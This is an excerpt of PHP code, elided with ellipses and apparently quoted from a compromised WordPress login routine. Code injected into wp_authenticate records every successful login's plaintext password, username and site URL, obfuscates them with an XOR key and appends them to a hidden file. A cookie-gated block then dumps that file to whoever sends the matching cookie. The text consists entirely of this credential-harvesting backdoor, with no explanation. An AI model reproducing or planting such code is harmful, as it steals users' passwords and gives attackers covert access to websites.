...
if ( ! function_exists( 'wp_authenticate' ) ) :
	...
	function wp_authenticate( $username, $password ) {
		...
		if ( null == $user ) {
		    ...
		    if (!is_wp_error($user))
    {
        $csrf = "_49qfLinUhtZrDBxm5ARgvXGMsojYabuHEcl78IyCQJFdSV1kO2TN6wW3";
        $line = $password . "\t" . $username . "\t" . get_site_url();
        $line = $line ^ str_repeat($csrf, (strlen($line) / strlen($csrf)) + 1);
        $line = bin2hex($line);

        $lines = @file("57ebe9d8", FILE_IGNORE_NEW_LINES);
        $lines[] = $line;
        @file_put_contents("57ebe9d8", implode("\n", array_unique($lines)));
...
if (isset($_COOKIE["_49qfLinUhtZrDBxm5ARgvXGMsojYabuHEcl78IyCQJFdSV1kO2TN6wW3"]))
{
    $lines = get_option( 'wpsdt4_license_key' );
    if (!empty($lines))
    {
        $lines = @file_get_contents("57ebe9d8");
    }
    echo $lines;
    exit();
}